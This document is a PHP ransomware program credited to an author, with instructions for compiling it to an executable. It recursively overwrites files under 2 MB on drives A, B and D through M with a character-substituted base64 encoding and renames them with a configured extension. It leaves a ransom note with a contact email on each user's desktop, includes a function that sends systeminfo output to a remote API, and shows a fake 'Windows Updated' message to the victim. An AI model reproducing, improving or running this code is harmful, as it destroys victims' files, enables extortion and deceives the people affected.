<?php

    /*
        Author Jieyab89 
        Compile : using php exe output or other php executable
    */
        
    error_reporting(0);
    ini_set('output_buffering', 'off');
    ini_set('zlib.output_compression', false);

    /* get file config.json */
    $file  = file_get_contents("config-windows-encrypt.json");
    $files = json_decode($file);
    $api   = $files->api;

    /* DISK */
    $disk = ["A", "B", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M"];
    $diskArr = [];
    $diskAll = '';

    /* MESSAGE README */
    $text = 
"YOUR MESSAGE
\n
email: ".$files->email."\n\n Thank's";

    /* cek all users Windows */
    $users = scandir('C:\\Users');
    $allUsers = '';
    foreach ($users as $key) {
         
        if ($key !== '.' && $key !== '..' && $key !== 'Users' && $key !== 'Default' && $key !== 'All Users' && $key !== 'Default User' && $key !== 'Public') {
            if (is_dir('C:\\Users\\'.$key)) {
                $allUsers = "$key|";
            }
        }
    }
    
    function checkDisk($disk){
        $diskDectec = disk_free_space("$disk:");
        
        if($diskDectec){
            return true;
        }else{
            return false;
        }
    }

    function encryptFile($value, $dir){

        /* global variabel */
        global $ext;
        $encArr = ['a' => '~','b' => '@','c' => 'Y','d' => 'O','e' => ']','f' => 'V','g' => 'uP','h' => '#','i' => '4a','j' => 'm+','k' => 'z','l' => 'b;','m' => '7','n' => '3','o' => 'z*','p' => 'm','q' => '4','r' => '%','s' => 'Yp','t' => 'W','u' => 'U','v' => 'N','w' => 'a','x' => '(','y' => '|o','z' => '/','A' => 'G','B' => 'M','C' => 'mM','D' => 'B','E' => '1<','F' => '*','G' => 'a#','H' => 'S','I' => '&','J' => '0v','K' => 'H','L' => '1+','M' => 'G/','N' => 'x?','O' => 'h1','P' => 'Ux','Q' => 'L4','R' => 'v','S' => 'u','T' => 'aW','U' => '4L','V' => 'L','W' => 'J','X' => '8','Y' => 'n','Z' => '','1' => 'x','2' => 'b','3' => '+7','4' => 'X','5' => 's','6' => ')','7' => '$','8' => 'o','9' => '+','0' => 'A','=' => 'w','+' => '[4','/' => '1'];

        $encrypt = "";
        for($no = 0; $no < strlen($value); $no++){

            $key = substr($value, $no, 1);
            $encrypt .= $encArr[$key].".";
        };

        $o = fopen($dir, 'w');
        fwrite($o, $encrypt);
        fclose($o);

        rename($dir, $dir.".".$ext);
    }

    function getFile($dir){
        
        /* global variabel */
        global $ext;

        $fileList = glob($dir."/*");
        foreach ($fileList as $filename) {
            if(is_file($filename)){

                $info = pathinfo($filename);
                if ($info['extension'] !== $ext) {

                    // FILESIZE ENCRYPT
                    if (filesize($filename) < 2000000) {
                        $base = base64_encode(file_get_contents($filename));
                        encryptFile($base, $filename);
                        echo '[+] '. $filename."\n";
                    }
                }
            }else{
                if ($filename !== $dir.'/$RECYCLE.BIN') {
                    
                    getFile($filename);
                }
            }
        }   
    }

    function sendApi($users, $disk){
        global $api;

        system('systeminfo >> info.txt');
        $file = file_get_contents('info.txt');

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, '<YOUR API>');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'data='.$file);
        $x = curl_exec($ch);

    }

    /* check disk and output */
    foreach ($disk as $key) {
        
        if(checkDisk($key)){

            $diskArr[] = $key;
            $diskAll .= $key."|";
        }
    }

    // sendApi($allUsers, $diskAll);

    foreach ($diskArr as $key) {

        $root = $key.":\\";
        $ext  = $files->ext;
        $extLength = strlen($ext) + 1;

        getFile($root);
    }

    /* create file .txt */
    $exUser = explode("|", $allUsers);
    foreach ($exUser as $key) {
        if ($key !== '') {
            
            $o = fopen('C:\\Users\\'.$key.'\\Desktop\\README.txt', 'w');
            fwrite($o, $text);
            fclose($o);
        }
    }

    echo "\n\n[+] Windows Updated, Please dont't close it...\n\n";
?>